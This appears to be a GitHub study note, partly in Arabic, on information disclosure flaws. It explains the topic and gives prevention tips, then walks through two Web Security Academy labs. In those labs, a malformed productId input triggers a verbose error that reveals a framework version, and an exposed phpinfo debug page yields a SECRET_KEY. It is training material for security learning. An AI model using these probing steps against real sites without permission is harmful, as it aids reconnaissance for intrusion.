# Information disclosure

* <details>


    
    # 🛡️ Information Disclosure (الإفصاح عن المعلومات)
    
    ## 🎯 ما هو Information Disclosure؟
    
    **Information Disclosure** أو "الإفصاح عن المعلومات" هو نوع من الثغرات الأمنية، يحدث عندما يقوم تطبيق أو نظام بكشف معلومات **حساسة** أو **غير مخصصة للمستخدم**. هذه المعلومات قد تكون مفيدة جدًا للمهاجم لتنفيذ هجوم متقدم، مثل:
    
    - كلمات مرور أو رموز API
    - أسماء مستخدمين
    - مسارات ملفات داخلية (`/etc/passwd`, `C:\Users\Admin\Desktop`)
    - إعدادات الخادم أو الكود البرمجي
    - إصدارات النظام أو البرامج
    - رسائل خطأ تفصيلية
    - قواعد بيانات أو معلومات عن الجداول
    - مفاتيح تشفير
    
    ---
    
    ## 🧠 أمثلة عملية
    
    ### 1. رسائل الخطأ المفصلة (Verbose Errors)
    
    ```php
    Warning: mysqli_connect(): (HY000/1045): Access denied for user 'root'@'localhost' (using password: YES)
    ```
    
    ⬅️ هذا المثال يُظهر اسم المستخدم في قاعدة البيانات.
    
    ### 2. عرض ملفات غير مخصصة (Directory Listing)
    
    زيارة الرابط:
    ```
    https://example.com/uploads/
    ```
    
    ⬅️ هذا يسمح برؤية ملفات غير مصرح بها.
    
    ### 3. ملف robots.txt فيه أسرار
    
    ```txt
    User-agent: *
    Disallow: /admin
    Disallow: /backup.zip
    ```
    
    ⬅️ قد يكشف هذا الملف عن ملفات مهمة مثل نسخة احتياطية.
    
    ### 4. الاستجابة تحتوي على بيانات حساسة
    
    ```json
    {
      "username": "admin",
      "password": "supersecret123"
    }
    ```
    
    ⬅️ تسريب مباشر لكلمات المرور.
    
    ---
    
    ## 🛡️ كيف تمنع Information Disclosure؟
    
    - ✅ عدم عرض رسائل خطأ مفصلة في بيئة الإنتاج
    - ✅ استخدام ملفات `.gitignore` و `.htaccess` بشكل صحيح
    - ✅ التأكد من صلاحيات الوصول للملفات
    - ✅ إخفاء رؤوس HTTP التي تكشف إصدار الخادم
    - ✅ فحص الكود لتسريبات مثل مفاتيح API أو كلمات مرور
    
    ---
    
    ## 🧪 أدوات للمساعدة
    
    - **Burp Suite** (لتحليل الردود والكشف عن معلومات حساسة)
    - **Dirb / Dirbuster** (للكشف عن ملفات أو مسارات غير محمية)
    - **Wappalyzer** (لكشف التقنيات المُستخدمة في الموقع)
    - **Nikto** (لكشف إعدادات خاطئة قد تؤدي للتسريب)
    

    
  </details>




---




<details>
    <summary>Lab: Information disclosure in error messages</summary>

> ### This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the ``version number`` of this framework. 

---

1. select product and intercept the request

```http
GET /product?productId=14 HTTP/2
Host: 0af4004a035cd3fa80028afc007b00bc.web-security-academy.net
Cookie: session=UFkGMCREvMWWvtzcAYCtB1X6EmX33YLO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af4004a035cd3fa80028afc007b00bc.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**``put the product id = '``**

```url
GET /product?productId=' HTTP/2
```

<img width="1520" height="675" alt="image" src="https://github.com/user-attachments/assets/9448b106-3b9e-48d3-9634-9bd0b8ebde0f" />

```ip
2.3.31
```
    
</details>





<details>
    <summary>Lab: Information disclosure on debug page</summary>

> ###  This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the ``SECRET_KEY`` environment variable. 

---


1. ``view page sourse``

<img width="796" height="377" alt="image" src="https://github.com/user-attachments/assets/bed8ee5b-e879-46eb-bb6d-77956d29e5f3" />

```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

2. now navigate:

```url
https://0a7c00d104bf2dae82109c31002d006a.web-security-academy.net/cgi-bin/phpinfo.php
```

<img width="1002" height="615" alt="image" src="https://github.com/user-attachments/assets/02ef5a51-f28a-40d0-8733-9f932ef055cb" />

```css
9l5zi0qwghgf3dycpuf6e0nb2lmdkwuk
```

    
</details>







<details>
    <summary></summary>
</details>





<details>
    <summary></summary>
</details>




<details>
    <summary></summary>
</details>

















































